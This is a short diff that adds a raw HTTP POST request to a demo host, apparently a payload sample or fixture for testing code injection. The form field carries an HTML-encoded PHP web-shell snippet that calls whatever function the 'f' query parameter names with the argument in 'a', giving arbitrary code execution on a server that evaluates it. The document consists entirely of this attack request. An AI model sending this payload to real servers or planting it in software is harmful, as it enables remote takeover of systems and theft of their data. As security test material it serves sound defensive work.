@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Connection: close
+
+input=$f=$_GET[&#39;f&#39;];$f($_GET[&#39;a&#39;]);
